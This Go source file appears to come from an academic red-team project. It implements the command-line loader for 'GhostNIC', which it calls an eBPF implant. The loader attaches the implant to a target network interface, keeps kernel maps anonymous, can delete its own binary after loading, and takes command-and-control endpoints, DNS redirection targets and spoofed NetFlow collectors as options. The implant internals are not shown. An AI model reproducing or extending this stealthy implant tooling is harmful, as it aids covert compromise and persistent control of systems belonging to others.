// ghost-load loads GhostNIC into the kernel, attaches to the target interface,
// and optionally self-destructs.  Maps are kept anonymous by default.
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/academic-redteam/ghostnic/pkg/config"
	"github.com/academic-redteam/ghostnic/pkg/loader"
	"github.com/spf13/cobra"
)

func main() {
	var (
		configPath   string
		iface        string
		dryRun       bool
		selfDestruct bool
		keepPins     bool
		dns          []string
		dns6         []string
		c2           []string
		netflow      []string
	)

	root := &cobra.Command{
		Use:   "ghost-load",
		Short: "Load the GhostNIC eBPF implant",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := config.Load(configPath)
			if err != nil {
				return err
			}
			if iface != "" {
				cfg.Interface = iface
			}
			if err := mergeCLI(cfg, dns, dns6, c2, netflow); err != nil {
				return err
			}

			if dryRun {
				fmt.Println("dry-run: configuration parsed successfully")
				fmt.Printf("interface: %s\n", cfg.Interface)
				fmt.Printf("dns targets: %d\n", len(cfg.DNSTargets))
				fmt.Printf("dns6 targets: %d\n", len(cfg.DNS6Targets))
				fmt.Printf("c2 targets: %d\n", len(cfg.C2))
				fmt.Printf("netflow collectors: %d\n", len(cfg.Netflow))
				return nil
			}

			res, err := loader.Load(cfg, selfDestruct, keepPins)
			if err != nil {
				return fmt.Errorf("load failed: %w", err)
			}

			fmt.Println("loaded")
			fmt.Printf("interface: %s\n", res.Interface)
			if selfDestruct {
				fmt.Println("loader binary removed")
			}
			return nil
		},
	}

	root.Flags().StringVarP(&configPath, "config", "c", "ghostnic.json", "path to GhostNIC JSON config")
	root.Flags().StringVarP(&iface, "iface", "i", "", "target network interface (overrides config)")
	root.Flags().BoolVarP(&dryRun, "dry-run", "d", false, "validate config without loading")
	root.Flags().BoolVarP(&selfDestruct, "self-destruct", "s", false, "delete the loader binary after load")
	root.Flags().BoolVar(&keepPins, "keep-pins", false, "leave bpffs pins in place (debug only)")
	root.Flags().StringArrayVar(&dns, "dns", nil, "DNS A target as domain:ip (repeatable)")
	root.Flags().StringArrayVar(&dns6, "dns6", nil, "DNS AAAA target as domain:ip6 (repeatable)")
	root.Flags().StringArrayVar(&c2, "c2", nil, "C2 endpoint as ip:port (repeatable)")
	root.Flags().StringArrayVar(&netflow, "netflow", nil, "NetFlow collector as addr:port:spoof (repeatable)")

	if err := root.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func mergeCLI(cfg *config.Config, dns, dns6, c2, netflow []string) error {
	for _, s := range dns {
		parts := strings.SplitN(s, ":", 2)
		if len(parts) != 2 {
			return fmt.Errorf("invalid --dns value %q (expected domain:ip)", s)
		}
		if cfg.DNSTargets == nil {
			cfg.DNSTargets = make(map[string]string)
		}
		cfg.DNSTargets[parts[0]] = parts[1]
	}
	for _, s := range dns6 {
		parts := strings.SplitN(s, ":", 2)
		if len(parts) != 2 {
			return fmt.Errorf("invalid --dns6 value %q (expected domain:ip6)", s)
		}
		if cfg.DNS6Targets == nil {
			cfg.DNS6Targets = make(map[string]string)
		}
		cfg.DNS6Targets[parts[0]] = parts[1]
	}
	for _, s := range c2 {
		parts := strings.SplitN(s, ":", 2)
		if len(parts) != 2 {
			return fmt.Errorf("invalid --c2 value %q (expected ip:port)", s)
		}
		var port uint16
		if _, err := fmt.Sscanf(parts[1], "%d", &port); err != nil {
			return fmt.Errorf("invalid --c2 port %q: %w", parts[1], err)
		}
		cfg.C2 = append(cfg.C2, config.C2Target{Address: parts[0], Port: port})
	}
	for _, s := range netflow {
		parts := strings.SplitN(s, ":", 3)
		if len(parts) != 3 {
			return fmt.Errorf("invalid --netflow value %q (expected addr:port:spoof)", s)
		}
		var port uint16
		if _, err := fmt.Sscanf(parts[1], "%d", &port); err != nil {
			return fmt.Errorf("invalid --netflow port %q: %w", parts[1], err)
		}
		cfg.Netflow = append(cfg.Netflow, config.NetflowTarget{
			Address: parts[0],
			Port:    port,
			Spoof:   parts[2],
		})
	}
	return nil
}
